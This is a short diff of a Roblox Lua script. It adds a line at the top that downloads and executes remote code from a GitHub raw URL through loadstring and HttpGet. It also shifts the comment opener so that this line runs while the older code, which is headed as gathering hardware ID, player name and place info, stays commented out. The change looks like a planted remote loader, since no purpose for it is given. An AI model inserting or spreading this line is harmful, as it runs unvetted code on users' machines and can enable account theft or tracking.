@@ -1,5 +1,8 @@
- --[[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Efield44444235364/Ban/refs/heads/main/Script%20Down.lua"))()
 
+
+
+--[[
 -- ===== HWID + Player Name + Place Info =====
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
